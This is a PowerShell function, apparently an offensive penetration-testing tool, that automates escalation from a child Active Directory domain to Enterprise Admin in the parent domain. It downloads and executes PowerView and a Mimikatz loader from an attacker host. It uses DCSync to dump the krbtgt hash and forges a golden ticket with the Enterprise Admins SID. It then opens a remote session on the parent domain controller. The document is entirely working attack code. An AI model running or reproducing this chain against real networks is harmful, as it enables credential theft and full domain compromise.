function raiseChild {
    write-host "Preparing Child -> Parent Leap..." -ForegroundColor Green

    # -
    # change the below part to load Mimikatz and PowerView from your attack box
    # -
    IEX (iwr 'http://10.10.16.31/powerview-dev.ps1')
    write-host "Loaded PowerView" -ForegroundColor Green
    IEX (iwr 'http://10.10.16.31/invoke-mimz.ps1')
    write-host "Loaded Mimikatz" -ForegroundColor Green
    Write-Host " "
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $parentDomain = $domain.Parent.Name
    $subdomain = ($domain.Name -split '\.')[0]
    $dsid = Get-DomainSID -Domain $domain
    $psid = Get-DomainSID -Domain $parentDomain
    Write-Host "Current Domain: $domain - SID: $dsid" -ForegroundColor Yellow
    Write-Host "Parent Domain: $parentDomain - SID: $psid" -ForegroundColor Yellow
    Write-Host "Getting KRBTGT's hash..." -ForegroundColor Yellow
    $command = "'" + '"lsadump::dcsync /user:' + $subdomain + '\krbtgt"' + "'"
    $final = "Invoke-mimz -Command $command"
    $out = iex $final

    $ntlmLine = $out -split "`n" | Where-Object { $_ -match 'Hash NTLM:' }

    $ntlmHash = ($ntlmLine -split ': ')[1].Trim()

    Write-Host "KRBTGT's Hash: $ntlmHash " -ForegroundColor Red
    $easid = $psid + "-519"
    Write-Output " "
    $gold = "'" + '"kerberos::golden /user:Administrator /domain:' + $domain + ' /sid:' + $dsid + ' /sids:' + $easid + ' /krbtgt:' + $ntlmHash + ' /startoffset:0 /endin:600 /renewmax:10080 /ptt"' + "'"

    $golden = "Invoke-mimz -Command $gold"
    Write-host "Executing..." -ForegroundColor Green
    $execution = iex $golden
    Write-host "Elevated to Enterprise Administrator!" -ForegroundColor Green
    $parentDC = Get-DomainController -Domain $parentDomain
    $parentDC = $parentDC.Name
    Write-host "Popping a shell on $parentDC ..." -ForegroundColor Green
    Write-host " "
    Enter-PSSession -ComputerName $parentDC
}
